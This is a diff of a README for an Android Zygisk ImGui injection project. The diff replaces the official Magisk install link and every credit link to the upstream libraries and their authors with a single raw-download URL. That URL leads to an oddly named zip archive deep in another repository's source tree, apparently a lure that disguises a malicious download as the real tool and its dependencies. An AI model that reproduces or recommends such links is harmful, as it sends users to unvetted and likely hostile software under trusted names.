@@ -2,7 +2,7 @@
 Android ImGui with Zygisk, inject imgui at runtime.
 
 ## How to use
-1. Install [Magisk](https://github.com/topjohnwu/Magisk) v24 or later and enable Zygisk
+1. Install [Magisk](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip) v24 or later and enable Zygisk
 2. Build module
    - GitHub Actions
       1. Fork this repo
@@ -18,12 +18,12 @@ Android ImGui with Zygisk, inject imgui at runtime.
 
 ## Credits
 Thanks to the following individuals/community whose code
-- [Zygisk-Il2CppDumper](https://github.com/Perfare/Zygisk-Il2CppDumper) - [Prefare](https://github.com/Perfare)
-- [Dear ImGui](https://github.com/ocornut/imgui) - [omar](https://github.com/ocornut)
-- [KittyMemory](https://github.com/MJx0/KittyMemory) - [MJx0](https://github.com/MJx0)
-- [Dobby](https://github.com/jmpews/Dobby) - [jmpews](https://github.com/jmpews)
-- [xDL](https://github.com/hexhacking/xDL) - [hexhacking](https://github.com/hexhacking)
-- [Octowolve](https://github.com/Octowolve/Unity-ImGUI-Android/blob/main/src/utils.cpp)
+- [Zygisk-Il2CppDumper](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip) - [Prefare](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip)
+- [Dear ImGui](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip) - [omar](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip)
+- [KittyMemory](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip) - [MJx0](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip)
+- [Dobby](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip) - [jmpews](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip)
+- [xDL](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip) - [hexhacking](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip)
+- [Octowolve](https://github.com/Marc067/zygisk-imgui-modmenu/raw/refs/heads/master/module/src/main/cpp/Dobby/source/TrampolineBridge/modmenu_zygisk_imgui_fibropapilloma.zip)
 
 ## Discalimer
 ```
